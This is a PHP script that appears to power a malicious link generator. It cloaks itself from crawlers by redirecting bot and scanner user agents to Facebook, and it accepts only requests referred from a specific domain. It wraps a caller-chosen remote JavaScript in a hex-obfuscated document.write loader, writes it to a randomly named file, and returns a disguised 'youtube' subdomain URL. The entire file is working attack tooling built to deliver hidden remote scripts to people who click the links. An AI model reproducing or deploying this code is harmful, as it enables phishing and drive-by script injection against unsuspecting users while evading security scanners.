<?php
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Headers: X-API-KEY, Origin, X-Requested-With, Content-Type, Accept, Access-Control-Request-Method");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE");
header("Allow: GET, POST, OPTIONS, PUT, DELETE");
require_once "./random_string.php";

if (preg_match('/bot|crawl|curl|dataprovider|search|get|spider|find|java|majesticsEO|google|yahoo|teoma|contaxe|yandex|libwww-perl|facebookexternalhit|facebook(external)/i', $_SERVER['HTTP_USER_AGENT'])) {
$short_urlx2 = "http://m.facebook.com/profile.php";
header("location: $short_urlx2", true, 200);
die();
}


if($_SERVER['HTTP_REFERER'] !== 'https://alienfb.trade/'){
 die('Unauthorized access');}

if (isset($_GET['api'])) {
$API =  $_GET['api'];   
$PROTOCOLO  =  "https://";
$NAMEFILE = generateRandomString();
$DOMAIN = $_SERVER['SERVER_NAME'];

$contentHTML = '
<html>
<head>
<meta http-equiv="cache-control" content="no-cache">
<meta name="referrer" content="no-referrer" />
<meta name="robots" content="index">
<meta name="robots" content="noindex">
<meta name="robots" content="nofollow">
</head>
<body>
<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>
</body>
</html>';

$contentHTMLEXTRAIDO = $contentHTML;	
$decode =  utf8_decode($contentHTMLEXTRAIDO);
$hex = bin2hex($decode);	
$script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';	

file_put_contents("youtube/links". "/" .$NAMEFILE, $script);
echo  'https://youtube.'.$DOMAIN.'/'.$NAMEFILE;
} 
